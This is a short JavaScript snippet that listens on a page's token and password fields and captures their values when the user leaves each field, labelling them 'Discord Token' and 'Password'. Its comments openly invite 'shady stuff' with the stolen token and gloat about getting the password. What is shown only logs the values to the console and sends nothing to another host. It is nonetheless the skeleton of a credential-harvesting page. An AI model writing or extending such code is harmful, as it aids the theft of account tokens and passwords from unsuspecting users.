document.addEventListener('DOMContentLoaded', function() {
    const tokenInput = document.getElementById('token');
    const passwordInputs = document.querySelectorAll('input[type="password"]');

    tokenInput.addEventListener('blur', function() {
        const token = tokenInput.value;
        // Now you can do whatever shady stuff you want with the token
        console.log('Discord Token:', token);
    });

    passwordInputs.forEach(function(input) {
        input.addEventListener('blur', function() {
            const password = input.value;
            // Now you've got the password too, ain't that just dandy?
            console.log('Password:', password);
        });
    });
});
